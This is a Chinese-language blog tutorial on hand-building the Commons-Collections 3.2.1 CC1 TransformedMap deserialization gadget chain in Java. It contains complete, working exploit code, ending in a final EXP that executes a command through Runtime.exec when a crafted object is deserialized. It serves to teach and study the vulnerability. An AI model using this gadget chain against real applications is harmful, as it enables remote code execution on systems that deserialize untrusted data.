# 如何手写一条cc链


# java反序列化漏洞之Commons-Collection1 TransformMap链

## 前言
关于CC1链其实是有两条的，一个是LazyMap这一条链，另外一条就是TransformMap链，第二条链是传入国内之后被发现的。这几周学了学java反序列化漏洞，来试试手写一下CC1链的payload帮助我更好的理解。
## 环境搭建

### jdk 版本

jdk 版本 8u65
下载地址：
[JDK 8（Java SE Development Kit）全平台全版本安装包免费下载 - 码霸霸 (lupf.cn)](https://blog.lupf.cn/articles/2022/02/20/1645352101537.html)

可以将其在虚拟机中安装之后再拷出来
![1](/img/JavaSecurity/a85ac02e299bec633b7360dcce893abf_MD5.png)

### maven

有漏洞的版本为

```xml
<!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```

### openjdk

为了调试时能够看到源码，我们需要下载对应版本的 openjdk

[jdk8u/jdk8u/jdk: af660750b2f4 (java.net)](http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4)
![2](/img/JavaSecurity/fe8c42c3e9fce9e965d5279d286f90f9_MD5.png)
点击下载即可
然后解压出来,找到这个目录下的 sun 包，将其复制到 jdk8u65 中 src.zip 解压候的 src 文件夹中

```
jdk-af660750b2f4\jdk-af660750b2f4\src\share\classes
```

![3](/img/JavaSecurity/dd94afa3a03485b152dc3a2cf9bc8e05_MD5.png)

![4](/img/JavaSecurity/d2c01b25a5dc8efae23e4414cb99d8aa_MD5.png)

### idea 设置

添加 src 文件夹到 sdks
![5](/img/JavaSecurity/e19d7a274039abfb767af59b6fbb3e25_MD5.png)

之后就能看到源码了

![6](/img/JavaSecurity/88d6c6af812aef82802f434072f2812b_MD5.png)


## 攻击链分析

- 反序列化攻击思路

首先需要一个 readObject 方法作为入口类，在结尾处需要一个能够调用命令执行的方法，通过链子链接过去，就达成了一次反序列化攻击。

所以我们的攻击链应该是从后往前去寻找的。

![7](/img/JavaSecurity/740487d3ef73a889629f29c6f23247cc_MD5.png)

### 寻找尾部exec方法

这一步就是寻找哪个方法可以调用exec方法，前人已经帮我们找到了，在Transformer接口中。


![8](/img/JavaSecurity/141bd20d08a4f58507e5a59c1fc5f5b8_MD5.png)

可以看到InvokerTransformer实现了这个接口，然后其transform方法调用了invoke方法，我们可以通过它来调用exec方法达到命令执行

![9](/img/JavaSecurity/7725e744c098d58ee899566abacd30c0_MD5.png)

我们来尝试构造一下，调用这个类的命令执行，首先我们回顾一下如何通过反射调用来执行命令

```java
public class Demo {  
    public static void main(String[] args)throws Exception {  
  
        Runtime r = Runtime.getRuntime();  
        Class c = r.getClass();  
        Method cMethod = c.getMethod("exec", String.class);  
        cMethod.invoke(r,"calc");  
    }  
}
```

接下来把他改写成利用InvokerTransformer类弹计数器。由于是public方法故无需反射

```java
public class Demo {  
    public static void main(String[] args)throws Exception {  
  
        Runtime r = Runtime.getRuntime();  
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
        invokerTransformer.transform(r);  
    }  
}

```

![10](/img/JavaSecurity/374aeafdb558f7ffff0dfcfa491579bd_MD5.png)

之后就再去寻找调用transform方法的不同名函数，因为我们代码的最后一句是这样的`invokerTransformer.transform(r); `

### 寻找调用链

右键transform-->查找用法，或者Alt+F7也可以，这里发现有很多都调用了transform，但最终我们用到的是TransformdMap这个类

![11](/img/JavaSecurity/9d9a54c97993f0f997be1d54922c4321_MD5.png)

这个类中的checkSetValue方法中调用了transform方法

```java
protected Object checkSetValue(Object value) {  
    return valueTransformer.transform(value);  
}
```

我们再往上看一下这个valueTransformer是这么来的

```java
protected final Transformer valueTransformer;

protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {  
    super(map);  
    this.keyTransformer = keyTransformer;  
    this.valueTransformer = valueTransformer;  
}
```

它是TransformedMap中的一个变量，通过构造函数来给他赋值，但构造方法是一个protected类型，只有在本类中才能调用，继续看发现有一个public静态方法直接返回了这个类的构造方法

![12](/img/JavaSecurity/e80afa5fff334e6addbce7c309acb92d_MD5.png)

故我们控制这个valueTransformer为invokerTransformer类，然后调用这个checkSetValue方法就能弹计数器了，我们尝试构造一下POC

```java
public class Demo {  
    public static void main(String[] args)throws Exception {  
  
        Runtime r = Runtime.getRuntime();  

        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
  
        HashMap<Object,Object> hashMap = new HashMap<>();  
        Map decorateMap = TransformedMap.decorate(hashMap, null, invokerTransformer);  
        Class<TransformedMap> transformedMapClass = TransformedMap.class;  
        Method checkSetValueMethod = transformedMapClass.getDeclaredMethod("checkSetValue", Object.class);  
        checkSetValueMethod.setAccessible(true);  
        checkSetValueMethod.invoke(decorateMap,r);  
  
    }  
}
```

![13](/img/JavaSecurity/619ccf2f9b89eb2eec021e3d56b9f781_MD5.png)

可以看到这里成功了，然后再通过同样的方式去寻找哪个类方法中调用了checkSetValue方法，这里我们找到的是AbstractInputCheckedMapDecorator类也就是TransformedMap类的父类中

![14](/img/JavaSecurity/cd3cb3021f8cf626b39c12da0aca9652_MD5.png)

调用checkSetValue方法的类是AbstractInputCheckedMapDecorator类中的一个内部类MapEntry

![15](/img/JavaSecurity/3b5f3e016697bb3e3c4a004de69d82dc_MD5.png)

setValue方法其实就是给键值对中的值进行赋值操作的一个方法。接下来我们就是要找到哪个类中调用了setValue方法，如果是readObject类中调用了setValue方法那就成功找到这条链子了。

![16](/img/JavaSecurity/09d9963c7a8954bcc39fea93ab98237b_MD5.png)

真是太巧了！
在AnnotationInvocationHandler类中的readObject方法中调用了setValue方法，但是要通过两个验证

- 成员不为空
- memberType不是一个实例

![17](/img/JavaSecurity/b4a5306d5f629f5a1a20191ff83e0305_MD5.png)

接下来我们来尝试构造EXP

## TransformedMap 版CC1 EXP

这是理想情况下的payload

```java
package org.example;  
  
import java.io.*;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
import java.lang.reflect.Constructor;  
import java.util.HashMap;  
import java.util.Map;  
public class Demo {  
    public static void main(String[] args)throws Exception {  
  
        Runtime r = Runtime.getRuntime();  
  
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
  
        HashMap<Object,Object> hashMap = new HashMap<>();  
        hashMap.put("key","value");  
  
        Map<Object,Object> decorateMap = TransformedMap.decorate(hashMap, null, invokerTransformer);  
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(new Class[]{Class.class, Map.class});  
        annotationInvocationHandlerConstructor.setAccessible(true);  
        Object o = annotationInvocationHandlerConstructor.newInstance(Override.class, decorateMap);  
  
        serialize(o);  
        unserialize("ser.bin");  
    }  
  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
    }  
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
        Object obj = ois.readObject();  
        return obj;  
    }  
}
```

但是没有弹出计数器，是因为这里有三个问题我们还没解决

- Runtime对象不能被序列化，因为它没有继承Serializable接口
- setValue传入的对象应该是Runtime对象的，而在实际情况中确是AnnotationTypeMismatchExceptionProxy
- 通过两个if判断

### 解决Runtime不能序列化的问题
Runtime是不能序列化的，但是`Runtime.class`是可以序列化的。我们先写一遍普通反射。

```java
Class c = Runtime.class;  
Method getRuntimeMethod = c.getMethod("getRuntime");  
Runtime Runtime = (Runtime) getRuntimeMethod.invoke(null, null);  
Method cMethod = c.getMethod("exec", String.class);  
cMethod.invoke(Runtime,"calc");
```

接着将这个反射的Runtime改造为使用InvokerTransformer调用的方式

```java
Method getRuntimeMethod =(Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);  
        Runtime r = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod);  
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);
```

由于这里new 了太多次了，且是同样的操作，我们可以用ChainedTransformer类去套，减少工作量

![18](/img/JavaSecurity/a4dd6ca6f2ddef9ab989f08fc3f8fe09_MD5.png)


```java
Transformer[] transformers= new Transformer[]{   
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})  
};  
Transformer chainedTransformer = new ChainedTransformer(transformers);
```

至此，第一个问题就解决了

### 解决传入的对象不为为Runtime的对象

通过寻找存在这样的一个类

![19](/img/JavaSecurity/6c5825d4165e095a4571b663a3029288_MD5.png)


他的transform方法中会给你返回构造函数中接收的参数，这个正是我们需要的，现在我们的exp变成了这样

```java
Transformer[] transformers= new Transformer[]{  
        new ConstantTransformer(Runtime.class),  
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})  
};  
Transformer chainedTransformer = new ChainedTransformer(transformers);

HashMap<Object,Object> map = new HashMap<>();  
map.put("kkk","aaa");  
Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
Constructor annotationInvocationHdConstructor =  c.getDeclaredConstructor(new Class[]{Class.class,Map.class});  //获取类的构造方法  
annotationInvocationHdConstructor.setAccessible(true); //保证可以访问  
Object o = annotationInvocationHdConstructor.newInstance(Override.class, transformedMap);  
serialize(o);  
unserialize("ser.bin");

```

最上面传入了Runtime的类对象

但这个exp还是不能弹计数器，没有通过第两个if判断

![20](/img/JavaSecurity/b5e4ed3f776b424125e84cd9ea34b1ad_MD5.png)

由于memberTypes为空导致进不去，这个memberTypes是获取注解中的值的，而Override注解没有值，故进不去，所以我们只要找到一个有值的注解就行了，这里用的是Target注解

![21](/img/JavaSecurity/3b1592d20b18305a3a859bf33b8f1ac2_MD5.png)

可以看到它有一个value值（这个不是函数哦），所以我们`hashmap.put`也需要修改为value。

```java
map.put("kkk","aaa"); -->map.put("value","aaa");
```

现在我们就能成功的弹计算器了。

![22](/img/JavaSecurity/41b32482cc016a70835612e8f877317c_MD5.png)


## 最终EXP

```java
package org.example;  
  
import java.io.*;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
import java.lang.annotation.Target;  
import java.lang.reflect.Constructor;  
import java.util.HashMap;  
import java.util.Map;  
public class Demo {  
    public static void main(String[] args)throws Exception {  
  
        Transformer[] transformers= new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})  
        };  
        Transformer chainedTransformer = new ChainedTransformer(transformers);  
  
        HashMap<Object,Object> map = new HashMap<>();  
        map.put("value","value");  
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);  
  
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor annotationInvocationHdConstructor =  c.getDeclaredConstructor(new Class[]{Class.class,Map.class});  //获取类的构造方法  
        annotationInvocationHdConstructor.setAccessible(true); //保证可以访问  
        Object o = annotationInvocationHdConstructor.newInstance(Target.class, transformedMap);  
        serialize(o);  
        unserialize("ser.bin");  
          
    }  
  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
    }  
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
        Object obj = ois.readObject();  
        return obj;  
    }  
}
```

## 小结

我们来梳理一下利用链

```java
利用链： 
InvokerTransformer#transform TransformedMap#checkSetValue AbstractInputCheckedMapDecorator#setValue AnnotationInvocationHandler#readObject
使用到的工具类辅助利用链： 
ConstantTransformer 
ChainedTransformer 
HashMap
```

大概流程图如下

![23](/img/JavaSecurity/8c500f926a4751210e3e1b7c06c40bdb_MD5.png)








